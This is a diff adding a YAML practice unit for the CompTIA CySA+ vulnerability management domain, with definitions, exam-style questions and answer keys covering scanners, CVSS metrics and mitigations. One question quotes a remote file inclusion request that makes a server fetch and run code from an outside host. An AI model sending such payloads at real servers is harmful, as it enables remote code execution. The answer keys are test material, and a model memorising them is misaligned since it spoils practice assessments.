@@ -1,0 +1,240 @@
+# CompTIA CySA+ CS0-004 - domain 2 (Vulnerability Management) extension.
+# Original content written against the public exam objectives. No real exam items.
+# Syllabus: docs/research/notes/blueprint_cysa_plus.md
+#   cy-2x  coverage of the domain 2 topics the base course names but does not test
+#   cy-2y  exam-hard practice built around inline artefacts (tool output, CVSS vectors)
+# CVSS scores quoted here are v3.1 base scores, each re-derived from its vector.
+part_of: cysa-plus
+units:
+  - id: cy-2x
+    title: "Vulnerability management: the rest of the syllabus"
+    domain: "2"
+    goal: "I can name every domain 2 tool, baseline, CVSS metric and mitigation, and say what each one is for."
+    notes: |
+      The foundations units taught the core of vulnerability management. This unit fills in the rest of the domain 2 objectives, name by name.
+
+      **Planning.** A *mapping scan* draws the network before anything is assessed. A scan's *sensitivity level* sets how intrusive its checks are; the sensitivity of the data on a target decides how often it is scanned and who may read the report. Baselines come from regulation (PCI DSS), from consensus hardening guides (CIS) or from a management standard (**ISO/IEC 27001**, with control guidance in **27002**).
+
+      **Tools.** Learn one sentence and one output shape for each:
+
+      | Tool | Output to recognise |
+      |---|---|
+      | Angry IP Scanner | a table of live addresses, ping times and hostnames |
+      | Recon-ng | open-source findings stored in a workspace |
+      | Nessus, OpenVAS | findings with severity, evidence and a solution |
+      | Nuclei | one line per matched template, with a severity tag |
+      | ScoutSuite, Prowler | failed cloud configuration checks |
+      | Caldera, Atomic Red Team | which ATT&CK techniques ran, and which were seen |
+
+      **CVSS, metric by metric.** AV, AC, PR and UI say how hard the attack is. Scope says whether the damage crosses a security boundary. C, I and A say what the damage is. Environmental metrics fit the score to your own systems.
+
+      **Fixing.** Secure coding removes a flaw at its source; patching and configuration management remove it at scale; a compensating control covers it when neither is possible.
+
+      **Governance.** OWASP **SAMM** scores how mature software security practice is, and supply chain risk is managed by knowing what your suppliers ship.
+    items:
+      # ── 2.1 scanning methods ──
+      - {id: cy-2x-mapping-scan, type: concept, term: "Mapping scan",
+         def: "A discovery sweep that finds which addresses are live and how they connect, producing a picture of the network's layout before any weakness checks are run."}
+      - {id: cy-2x-scan-sensitivity, type: concept, term: "Scan sensitivity level",
+         def: "The setting that controls how thorough and intrusive an assessment's checks are, from safe checks only up to tests that may crash a fragile service."}
+      - {id: cy-2x-iso-27001, type: concept, term: "ISO/IEC 27001",
+         def: "The international standard that sets the requirements for an information security management system and against which an organization can be independently certified."}
+      - {id: cy-2x-iso-27002, type: concept, term: "ISO/IEC 27002",
+         def: "The international reference catalogue of information security controls with guidance on implementing each one; it is a companion to the certifiable management-system standard and is not itself certified against."}
+      - {id: cy-2x-q01, type: mcq,
+         q: "A team is about to assess a newly acquired subsidiary. All it has is an address range; there is no network documentation. What should it run FIRST?",
+         choices: ["A credentialed vulnerability scan", "A mapping scan", "A security baseline scan", "A web application scan"],
+         answer: 1,
+         why: "Discovery comes before assessment: a mapping scan shows which hosts exist and how they are laid out, which defines the targets. A credentialed scan needs to know the hosts, and have accounts on them, before it can start."}
+      - {id: cy-2x-q02, type: mcq,
+         q: "A scan policy can be run with 'safe checks' switched off, so that it also attempts tests known to crash some services. For which target is that setting MOST appropriate?",
+         choices: ["The production payment database, during trading hours", "A programmable logic controller on the plant floor", "A cloned copy of a server on an isolated test network", "Every host in scope, so that all results are comparable"],
+         answer: 2,
+         why: "Intrusive checks belong where a crash costs nothing, such as a test copy. Using one setting everywhere sounds consistent, but it puts fragile and business-critical systems at risk for no extra insight."}
+      - {id: cy-2x-q03, type: mcq,
+         q: "A credentialed scan report for the finance servers lists every missing patch, local account and software version on them. How should the report itself be handled?",
+         choices: ["As sensitive data, readable only by those who must act on it", "As public information, since the flaws are published CVEs", "As a routine log, e-mailed to the all-staff distribution list", "As disposable output, deleted when the scan window closes"],
+         answer: 0,
+         why: "The report is a map of how to attack the servers, so it inherits the sensitivity of the systems it describes. The CVEs are public, but the fact that these particular servers have them is not."}
+      - {id: cy-2x-q04, type: mcq,
+         q: "An organization wants an accredited auditor to certify its information security management system. Against which document is it audited?",
+         choices: ["ISO/IEC 27002", "A CIS benchmark", "PCI DSS", "ISO/IEC 27001"],
+         answer: 3,
+         why: "ISO/IEC 27001 holds the requirements and is the certifiable standard. ISO/IEC 27002 is the near neighbour: it gives guidance on the controls, but nobody is certified against it."}
+      - {id: cy-2x-q05, type: mcq,
+         q: "A team wants a pass/fail scan of its Windows servers against exact settings, such as the minimum password length and which services are disabled. Someone suggests ISO/IEC 27001 as the baseline. Why is a CIS benchmark the better fit?",
+         choices: ["ISO/IEC 27001 applies only to systems that handle payment cards", "ISO/IEC 27001 has been withdrawn in favour of the CIS benchmarks", "ISO/IEC 27001 sets management-system requirements, not product settings", "ISO/IEC 27001 may be used only by accredited external auditors"],
+         answer: 2,
+         why: "ISO/IEC 27001 says that secure configuration must be managed; it does not say what value each Windows setting should have. A CIS benchmark gives setting-by-setting values a scanner can test. Payment cards are the subject of PCI DSS."}
+      # ── 2.2 tools ──
+      - {id: cy-2x-angry-ip, type: concept, term: "Angry IP Scanner",
+         def: "A lightweight, cross-platform graphical tool that pings a range of addresses and lists the live ones with response time, hostname and selected open ports."}
+      - {id: cy-2x-recon-ng, type: concept, term: "Recon-ng",
+         def: "A modular command-line framework for open-source intelligence gathering, with a console that resembles an exploitation framework's, whose modules harvest hosts and contacts into a workspace database."}
+      - {id: cy-2x-nessus, type: concept, term: "Nessus",
+         def: "A commercial network vulnerability scanner from Tenable whose checks are delivered as numbered plugins, each reporting a severity, the evidence found and a solution."}
+      - {id: cy-2x-openvas, type: concept, term: "OpenVAS",
+         def: "The open-source network vulnerability scanner maintained by Greenbone, which runs a feed of vulnerability tests and attaches a quality-of-detection percentage to each result."}
+      - {id: cy-2x-nuclei, type: concept, term: "Nuclei",
+         def: "A fast open-source scanner that sends requests defined in community-written YAML templates and prints one line for each template that matches a target."}
+      - {id: cy-2x-scoutsuite, type: concept, term: "ScoutSuite",
+         def: "An open-source multi-cloud auditing tool that gathers an account's configuration through the provider's APIs and builds an HTML report of risky settings for offline review."}
+      - {id: cy-2x-caldera, type: concept, term: "Caldera",
+         def: "MITRE's open-source adversary emulation platform, in which a server directs agents on test hosts to run chains of ATT&CK-mapped abilities as an automated operation."}
+      - {id: cy-2x-lfi, type: concept, term: "Local file inclusion (LFI)",
+         def: "A web flaw in which user input chooses a file already stored on the server, which the application then loads or executes as part of the page."}
+      - {id: cy-2x-rfi, type: concept, term: "Remote file inclusion (RFI)",
+         def: "A web flaw in which user input makes the application fetch a file from an address the attacker controls and run it."}
+      - {id: cy-2x-q06, type: mcq,
+         q: "An analyst wants to list a company's subdomains and staff contacts from public sources, by loading modules into a workspace at a command-line console, without sending any probes to the company's servers. Which tool fits?",
+         choices: ["Masscan", "OpenVAS", "Burp Suite", "Recon-ng"],
+         answer: 3,
+         why: "Recon-ng is a modular OSINT framework that stores what its modules harvest in a workspace. Masscan and OpenVAS both send probes to the targets, and Burp Suite tests a web application by talking to it."}
+      - {id: cy-2x-q07, type: mcq,
+         q: "A Nessus report for a web server contains 3 Critical, 5 Medium and 41 Info results. One of the Info results is 'Service Detection' on port 443. How should the Info results be read?",
+         choices: ["As observations, not weaknesses in themselves", "As flaws with the same deadline as the Critical results", "As proof that the scanner failed to authenticate", "As false positives to be deleted from the report"],
+         answer: 0,
+         why: "Informational plugins record what the scanner saw, such as services and versions; they are useful for inventory and context but are not vulnerabilities. They are accurate observations, so they are not false positives either."}
+      - {id: cy-2x-q08, type: mcq,
+         q: "Two OpenVAS results arrive for one host. Result 1: severity 9.8, QoD 30%. Result 2: severity 7.5, QoD 97%. What does the QoD figure tell the analyst?",
+         choices: ["How likely the flaw is to be exploited in the next 30 days", "How reliable the detection is, so result 1 needs verifying first", "What share of the scanned hosts have the flaw", "How much of the flaw the available patch removes"],
+         answer: 1,
+         why: "Quality of detection rates how trustworthy the test method is: a low value usually means the result was inferred, for example from a banner, and may be a false positive. Likelihood of exploitation is what EPSS estimates, not QoD."}
+      - {id: cy-2x-q09, type: mcq,
+         q: "What defines the checks that Nuclei runs against a target?",
+         choices: ["YAML templates", "NASL plugins", "Ruby modules", "Terraform policies"],
+         answer: 0,
+         why: "Each Nuclei check is a YAML template describing the request to send and what a match looks like. NASL is the scripting language behind Nessus and OpenVAS tests, and Metasploit modules are written in Ruby."}
+      - {id: cy-2x-q10, type: mcq,
+         q: "A consultant must review a client's AWS, Azure and Google Cloud accounts with read-only credentials and take away a self-contained HTML report to study offline. Which tool is designed for this?",
+         choices: ["Checkov", "Trivy", "Nikto", "ScoutSuite"],
+         answer: 3,
+         why: "ScoutSuite collects configuration from several cloud providers through their APIs and writes an HTML report. Checkov reads infrastructure-as-code templates rather than the live accounts, and Trivy is mainly an image and file system scanner."}
+      - {id: cy-2x-q11, type: mcq,
+         q: "A blue team wants to test its detections against a realistic intrusion: a central server should task an agent on a test host to run a whole chain of ATT&CK techniques from an adversary profile, one after another. Which tool is built for this?",
+         choices: ["Atomic Red Team", "Caldera", "Nuclei", "Recon-ng"],
+         answer: 1,
+         why: "Caldera runs automated operations: its server sends an agent a sequence of abilities drawn from an adversary profile. Atomic Red Team is the near neighbour, but it is a library of single tests that are run one at a time."}
+      - {id: cy-2x-q12, type: mcq,
+         q: "A tester has captured one login request in Burp Suite and wants to resend it by hand several times, editing a parameter and reading the response each time. Which Burp tool is meant for this?",
+         choices: ["Intruder", "Decoder", "Repeater", "Comparer"],
+         answer: 2,
+         why: "Repeater resends a single request under manual control. Intruder is the near neighbour: it automates large numbers of requests from payload lists, which is not what is wanted here."}
+      - {id: cy-2x-q13, type: mcq,
+         q: "A web server log shows GET /index.php?page=http://203.0.113.9/s.txt, followed at once by an outbound request from the server to 203.0.113.9. The text it fetches is then executed as PHP. Which flaw is this?",
+         choices: ["Local file inclusion", "Remote file inclusion", "Directory traversal", "Cross-site request forgery"],
+         answer: 1,
+         why: "The application was made to fetch and run a file from the attacker's server: remote file inclusion. Local file inclusion would load a file already on the web server, and traversal only reads a file outside the intended folder."}
+      - {id: cy-2x-m01, type: multi,
+         q: "Which THREE tools assess cloud accounts or infrastructure-as-code for insecure configuration? (Choose THREE.)",
+         choices: ["ScoutSuite", "Nikto", "Prowler", "Recon-ng", "Checkov", "Angry IP Scanner"],
+         answers: [0, 2, 4],
+         why: "ScoutSuite and Prowler audit live cloud accounts through provider APIs, and Checkov checks the templates that build them. Nikto scans web servers, Recon-ng gathers open-source intelligence and Angry IP Scanner finds live addresses."}
+      - {id: cy-2x-m02, type: multi,
+         q: "Which TWO tools are network vulnerability scanners that report each finding with a severity and a recommended solution? (Choose TWO.)",
+         choices: ["Maltego", "Nessus", "Angry IP Scanner", "OpenVAS", "Recon-ng"],
+         answers: [1, 3],
+         why: "Nessus and OpenVAS run libraries of vulnerability tests and report severity, evidence and a fix. Maltego and Recon-ng gather open-source intelligence, and Angry IP Scanner only finds live hosts and ports."}
+      - {id: cy-2x-o01, type: order,
+         q: "A full Nmap run includes the phases below. Put them in the order Nmap performs them.",
+         steps: ["Host discovery", "Port scanning", "Service and version detection", "NSE script scanning of the services found"],
+         why: "Each phase feeds the next: Nmap must know a host is up before scanning its ports, must find open ports before probing what runs on them, and runs its service scripts against what version detection identified."}
+      # ── 2.3 scoring, criteria, mitigation ──
+      - {id: cy-2x-attack-vector, type: concept, term: "Attack vector (AV)",
+         def: "The CVSS base metric recording how close the attacker must be to the target: across a routed network, on the same segment, logged in on the machine, or physically touching it."}
+      - {id: cy-2x-attack-complexity, type: concept, term: "Attack complexity (AC)",
+         def: "The CVSS base metric recording whether success depends on conditions outside the attacker's control, such as winning a race or finding a non-default configuration."}
+      - {id: cy-2x-privileges-required, type: concept, term: "Privileges required (PR)",
+         def: "The CVSS base metric recording the level of access the attacker must already hold on the target before the exploit can be attempted."}
+      - {id: cy-2x-user-interaction, type: concept, term: "User interaction (UI)",
+         def: "The CVSS base metric recording whether someone other than the attacker must do something, such as opening a file, for the exploit to work."}
+      - {id: cy-2x-scope, type: concept, term: "Scope (S)",
+         def: "The CVSS v3 base metric recording whether a successful exploit can affect resources beyond the security authority of the vulnerable component, as in an escape from a virtual machine to its host."}
+      - {id: cy-2x-environmental, type: concept, term: "Environmental metrics (CVSS)",
+         def: "The optional CVSS group in which an organization re-weights confidentiality, integrity and availability and adjusts base values to reflect its own deployment of the affected system."}
+      - {id: cy-2x-kev, type: concept, term: "Known Exploited Vulnerabilities (KEV) catalog",
+         def: "The list published by the US agency CISA of flaws for which there is reliable evidence of exploitation in the wild, widely used to decide what must be patched urgently."}
+      - {id: cy-2x-compensating, type: concept, term: "Compensating control",
+         def: "An alternative safeguard put in place when the required one cannot be applied, giving comparable protection, such as isolating a server that cannot be patched."}
+      - {id: cy-2x-param-query, type: concept, term: "Parameterized query",
+         def: "A database statement whose structure is fixed in advance and to which user-supplied values are bound separately, so they can never be interpreted as commands."}
+      - {id: cy-2x-config-mgmt, type: concept, term: "Configuration management",
+         def: "Defining an approved build for each type of system, deploying it consistently, and detecting and correcting any drift away from it."}
+      - {id: cy-2x-q14, type: mcq,
+         q: "An attacker e-mails a crafted PDF. The flaw in the PDF reader is triggered only when the recipient opens the file on their own computer. How does CVSS v3.1 score attack vector and user interaction for the flaw?",
+         choices: ["AV:N and UI:N", "AV:N and UI:R", "AV:L and UI:R", "AV:P and UI:R"],
+         answer: 2,
+         why: "The reader is attacked by a file opened locally, and the specification scores a flaw that relies on a user opening a malicious document as Local with interaction Required. AV:N is tempting because the file arrived by e-mail, but the reader is not itself reachable over the network."}
+      - {id: cy-2x-q15, type: mcq,
+         q: "A flaw in a hypervisor lets code running inside a guest virtual machine execute on the host. Which CVSS v3.1 base metric value records this crossing of a security boundary?",
+         choices: ["S:C", "AV:A", "PR:H", "AC:H"],
+         answer: 0,
+         why: "Scope is Changed when the exploited component (the guest's virtual hardware) and the affected component (the host) are under different security authorities. AV:A describes where the attacker must be, not what the damage reaches."}
+      - {id: cy-2x-q16, type: mcq,
+         q: "One flaw, base score 7.5 with an availability impact only, affects both a marketing brochure site and an emergency-dispatch system where downtime endangers life. Which part of CVSS lets the organization score the dispatch system higher?",
+         choices: ["The base metrics", "The temporal metrics", "The environmental metrics", "The qualitative severity rating"],
+         answer: 2,
+         why: "Environmental metrics include security requirements, so availability can be weighted High for the dispatch system. Base metrics are the same for everyone, and temporal metrics track exploit and patch maturity, not the importance of an asset."}
+      - {id: cy-2x-q17, type: mcq,
+         q: "A scanner tests a server for a specific flaw and reports nothing. An engineer checks by hand and confirms the server is not vulnerable. How is the scanner's result classed?",
+         choices: ["True positive", "False positive", "False negative", "True negative"],
+         answer: 3,
+         why: "The scanner said 'not present' and that was correct: a true negative. A false negative would be the same silence on a server that really was vulnerable."}
+      - {id: cy-2x-q18, type: mcq,
+         q: "A laboratory instrument is driven by a controller whose vendor forbids operating system patches, and it cannot be replaced for two years. Which action is a compensating control for its unpatched flaws?",
+         choices: ["Placing it on its own VLAN, with a firewall that permits only the one workstation it needs", "Recording an approved exception in the risk register, with an expiry date two years away", "Buying a cyber-insurance policy that covers losses from a compromise of the instrument", "Raising the severity of the controller's findings in the scanner so they stay visible"],
+         answer: 0,
+         why: "Isolation reduces the chance that the flaws can be reached, which is what the missing patch would have done. An exception only documents the decision, and insurance transfers cost without protecting the device."}
+      - {id: cy-2x-q19, type: mcq,
+         q: "A product review containing a script tag is saved and later runs in the browser of every customer who views the product. Which secure coding practice fixes the root cause?",
+         choices: ["Binding user values to parameterized queries", "Encrypting the reviews table at rest", "Encoding user-supplied data when it is written into the page", "Lengthening the session identifier"],
+         answer: 2,
+         why: "Cross-site scripting happens when user data is written into a page as markup; output encoding makes the browser display it instead of running it. Parameterized queries stop SQL injection, which is a different flaw."}
+      - {id: cy-2x-q20, type: mcq,
+         q: "A form field should contain a five-digit postal code. Which input validation design is the STRONGEST?",
+         choices: ["A server-side blocklist that rejects known attack strings", "A server-side allowlist that accepts only five digits", "A browser script that checks the format before submission", "A server-side filter that strips quotation marks"],
+         answer: 1,
+         why: "Accepting only the known-good pattern rejects everything unexpected, including attacks nobody has listed yet. A blocklist misses new variants, and browser-side checks are bypassed by sending the request directly."}
+      - {id: cy-2x-q21, type: mcq,
+         q: "File integrity monitoring raises an alert when a system binary on a server changes. How is this control classified by type and by function?",
+         choices: ["Technical and detective", "Technical and preventative", "Administrative and detective", "Physical and corrective"],
+         answer: 0,
+         why: "It is implemented in software (technical) and reports a change after it has happened (detective). It does not stop the change, so it is not preventative."}
+      - {id: cy-2x-m03, type: multi,
+         q: "Which TWO of these are CVSS v3.1 base metrics? (Choose TWO.)",
+         choices: ["Attack complexity", "Exploit code maturity", "Scope", "Confidentiality requirement", "Remediation level"],
+         answers: [0, 2],
+         why: "Attack complexity and Scope are part of the base group. Exploit code maturity and remediation level are temporal metrics, and confidentiality requirement is an environmental metric."}
+      - {id: cy-2x-o02, type: order,
+         q: "Put the stages of the vulnerability management cycle in order.",
+         steps: ["Identify the assets in scope from the inventory", "Scan the assets", "Analyse and prioritise the findings", "Remediate or mitigate", "Rescan to validate the fix"],
+         why: "You cannot scan what you have not identified, cannot prioritise before there are findings, and cannot validate a fix that has not been applied. The cycle then starts again."}
+      # ── 2.4 controls, risk, governance, application security, third parties ──
+      - {id: cy-2x-risk-appetite, type: concept, term: "Risk appetite",
+         def: "The amount and kind of exposure that leadership has decided the organization is willing to carry in pursuit of its goals."}
+      - {id: cy-2x-corrective-control, type: concept, term: "Corrective control",
+         def: "A safeguard that repairs damage and returns a system to a known good state after an event is over, such as restoring data from a backup."}
+      - {id: cy-2x-samm, type: concept, term: "OWASP Software Assurance Maturity Model (SAMM)",
+         def: "An open framework for assessing and improving how well an organization builds security into software, scoring practices grouped under governance, design, implementation, verification and operations."}
+      - {id: cy-2x-supply-chain, type: concept, term: "Supply chain risk",
+         def: "Exposure that reaches an organization through the vendors, components, build tools and service providers that its own products and operations depend on."}
+      - {id: cy-2x-q22, type: mcq,
+         q: "An internal application has a flaw that will take months to fix in code. Its owner puts a web application firewall rule in front of it and limits access to one user group, which lowers the chance of exploitation. Which risk management strategy is this?",
+         choices: ["Accept", "Avoid", "Transfer", "Mitigate"],
+         answer: 3,
+         why: "Adding controls that reduce likelihood or impact while keeping the activity is mitigation. Acceptance would mean carrying the risk as it is, and avoidance would mean withdrawing the application."}
+      - {id: cy-2x-q23, type: mcq,
+         q: "A software company wants to measure how well security is built into its own development practices, compare teams, and plan a roadmap of improvements. Which resource is designed for this?",
+         choices: ["A software bill of materials", "OWASP SAMM", "A static analysis tool", "The CVSS specification"],
+         answer: 1,
+         why: "SAMM is a maturity model: it scores an organization's software security practices and guides improvement. A static analysis tool finds flaws in one code base; it does not measure the maturity of the practice around it."}
+      - {id: cy-2x-q24, type: mcq,
+         q: "A build pipeline step reads a project's dependency manifest and fails the build because an included open-source library version has a published CVE. Which technique is this?",
+         choices: ["Static application security testing", "Dynamic application security testing", "Breach and attack simulation", "Software composition analysis"],
+         answer: 3,
+         why: "Checking third-party components against known flaws is software composition analysis. SAST is the near neighbour, but it examines the code the team wrote itself, not the versions of the libraries it pulls in."}
+      - {id: cy-2x-q25, type: mcq,
+         q: "A critical finding cannot be fixed inside the deadline the policy sets. Under sound governance, who decides whether an exception is granted?",
+         choices: ["The analyst who found the flaw", "The administrator who would apply the patch", "A risk owner with the authority the policy assigns", "The scanner vendor's support team"],
+         answer: 2,
+         why: "Accepting risk beyond policy is a business decision, so it belongs to an accountable owner at the level the policy names. The analyst advises and the administrator implements; neither should approve their own exception."}
